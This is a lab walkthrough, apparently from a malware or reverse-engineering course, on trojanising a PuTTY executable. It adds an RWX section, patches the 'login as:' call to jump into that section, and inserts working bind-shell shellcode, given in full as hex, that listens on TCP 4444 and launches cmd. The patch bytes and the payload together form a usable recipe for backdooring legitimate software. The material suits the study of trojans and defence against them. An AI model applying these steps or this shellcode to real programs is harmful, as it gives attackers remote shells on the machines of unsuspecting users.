# Lab 19.2: EXE With Trojan Code
## Objective
* To modify a Windows EXE file and save an altered version containing Trojan code in a new PE section

## Prerequisite
* Previous lab PE file
* x32dbg
* CFF Explorer

## Lab Walkthrough
Make a duplicate for `PuTTY` as if anything went wrong, we still have backup

<img width="618" height="667" alt="image" src="https://github.com/user-attachments/assets/09ce2eca-42ed-49bf-b077-b09606940434" />

Open it in `CFF Explorer` 

<img width="2880" height="1699" alt="image" src="https://github.com/user-attachments/assets/a6950eba-52e3-4502-a634-c0e691cf4a4d" />

Go to `Section Header`

<img width="2135" height="623" alt="image" src="https://github.com/user-attachments/assets/cdddf2b5-9871-4af9-b0a3-11c247945972" />

We will create another section here with the following detail:
* `name` = .newsec
* `virtual size` = 0x1000
* `raw size` = 0x1000
* `flag` = rwx

<img width="2012" height="660" alt="image" src="https://github.com/user-attachments/assets/c67473ae-68e4-42d6-9fe1-ec4b09f0b437" />

<img width="680" height="692" alt="image" src="https://github.com/user-attachments/assets/2596b63d-bd61-4677-ae51-d5586c81c08a" />

Now we need to fix the optional headers as the image size and checksum is now being modified. Go to `rebuilder`

<img width="1615" height="883" alt="image" src="https://github.com/user-attachments/assets/025dd87e-58af-4f62-a0d6-5de98b2a6621" />

Rebuild the image

<img width="683" height="338" alt="image" src="https://github.com/user-attachments/assets/a42fa92a-09f2-441a-87dc-7f627c1644df" />

Save the PE file and open it in `x32dbg`

<img width="2551" height="1424" alt="image" src="https://github.com/user-attachments/assets/29dd5c05-5995-4ce4-a25d-2ed08d513979" />

We will make it when connect to any ssh server, the program will not call the login as, instead go to our new section just created. Find the `login as:` string like the previous lab

<img width="1936" height="914" alt="image" src="https://github.com/user-attachments/assets/c88418a8-a771-45db-a953-1c12d35cccf8" />

Change it to our section. Look at the Memory map so we will know our address

<img width="1294" height="446" alt="image" src="https://github.com/user-attachments/assets/122932d1-96ec-4c41-8c44-44e49b15527c" />

patch the program from
```
0041CB6E | 68 7C7C4600              | push test.467C7C                        | 467C7C:"login as: "
```
to
```
0041CB6E | E9 8D740600              | jmp test.484000                         |
```
<img width="1324" height="465" alt="image" src="https://github.com/user-attachments/assets/95325cf8-df87-455e-805d-13d4b7c43367" />


Move to our section to insert a break in our code by modified
```
00484000 | A8 1B                    | test al,1B                              |
```
to
```
00484000 | CC                       | int3                                    |
00484001 | 90                       | nop                                     |
```
<img width="1734" height="826" alt="image" src="https://github.com/user-attachments/assets/a7b9bbb7-a371-46df-a70c-f6e92016a405" />

Testing it

<img width="1145" height="1440" alt="image" src="https://github.com/user-attachments/assets/696a3fc4-9a2f-4379-b394-0487c420d543" />

Save the modified EXE

<img width="1266" height="1194" alt="image" src="https://github.com/user-attachments/assets/d044d61f-4b23-4de5-8320-f6738eedcd2a" />

Open the modified EXE we just did in any Hex Editor and find the pattern we just see
```
00484000 | CC                       | int3                                    |
00484001 | 90                       | nop                                     |
00484002 | 0000                     | add byte ptr ds:[eax],al                |
00484004 | 0002                     | add byte ptr ds:[edx],al                |
```
-> `CC 90 00 00 00 02`

Or checking the address of the section we just create

<img width="1474" height="383" alt="image" src="https://github.com/user-attachments/assets/6571b225-4d55-4357-b1a2-d29ba7f25375" />

<img width="1666" height="867" alt="image" src="https://github.com/user-attachments/assets/bd907af6-7286-43eb-aad8-964fdde2a0ba" />

I will use the Shell code provided in the lab manual, this is a shellcode to listen to tcp / 4444
```
fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52 10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1 51 8b 59 20 01 d3 8b 49 18 e3 3a 49 8b 34 8b 01 d6 31 ff ac c1 cf 0d 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a 8b 12 eb 8d 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 ff d5 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 08 59 50 e2 fd 40 50 40 50 68 ea 0f df e0 ff d5 97 68 02 00 11 5c 89 e6 6a 10 56 57 68 c2 db 37 67 ff d5 57 68 b7 e9 38 ff ff d5 57 68 74 ec 3b e1 ff d5 57 97 68 75 6e 4d 61 ff d5 68 63 6d 64 00 89 e3 57 57 57 31 f6 6a 12 59 56 e2 fd 66 c7 44 24 3c 01 01 8d 44 24 10 c6 00 44 54 50 56 56 56 46 56 4e 56 56 53 56 68 79 cc 3f 86 ff d5 89 e0 4e 56 46 ff 30 68 08 87 1d 60 ff d5 bb f0 b5 a2 56 68 a6 95 bd 9d ff d5 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 53 ff d5
```

<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/90a0a033-1b28-49ad-9e9f-4de2637fd29a" />

Save it and open our packed file, test it

<img width="1625" height="1003" alt="image" src="https://github.com/user-attachments/assets/4ba646ee-2405-4dba-80d3-c5241a146409" />

Go to cmd, type this command
```
netstat -an | findstr 4444
```
<img width="1451" height="561" alt="image" src="https://github.com/user-attachments/assets/be429b1c-2908-49c8-a324-df844e92ac8c" />
